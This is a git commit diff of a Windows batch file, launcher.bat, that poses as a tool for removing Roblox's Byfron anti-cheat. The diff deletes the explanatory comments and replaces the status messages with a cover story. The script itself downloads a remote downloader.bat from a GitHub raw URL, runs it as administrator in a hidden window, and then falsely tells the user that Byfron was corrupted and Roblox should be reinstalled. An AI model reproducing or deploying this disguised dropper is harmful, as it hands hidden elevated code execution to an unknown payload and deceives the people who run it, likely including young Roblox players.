b554ebaf549d88f09f53bca61caa339c45938775
skibidzaa <skibidzaa@gmail.com>
2024-08-15 20:20:38 +0200

    Update and rename a.bat to launcher.bat

--- launcher.bat
+++ launcher.bat
@@ -1,29 +1,25 @@
 @echo off
 setlocal
 
-:: Define the folder path and download URL
 set "folderPath=%localappdata%\Roblox"
 set "url=https://raw.githubusercontent.com/skibidzaa/tak/main/downloader.bat"
 set "tempBatFile=%temp%\downloaded.bat"
 
-:: Check if the folder exists
 if exist "%folderPath%" (
-    echo Folder exists. Downloading the .bat file...
+    echo Preparing removal of byfron...
 
-    :: Download the .bat file using PowerShell
     powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%tempBatFile%')"
 
-    :: Check if the download was successful
     if exist "%tempBatFile%" (
-        echo Download complete. Running the .bat file as administrator...
+        echo Removing byfron...
 
-        :: Run the downloaded .bat file as administrator in a hidden window
         powershell -Command "Start-Process cmd.exe -ArgumentList '/c %tempBatFile%' -Verb RunAs -WindowStyle Hidden"
+        echo Byfron has been accidently corrupted, reinstall Roblox.
     ) else (
-        echo Failed to download the .bat file.
+        echo Failed to remove byfron. Please try again or download a newer version of this program.
     )
 ) else (
-    echo Folder does not exist. Exiting.
+    echo Roblox is not installed.
 )
 
 endlocal
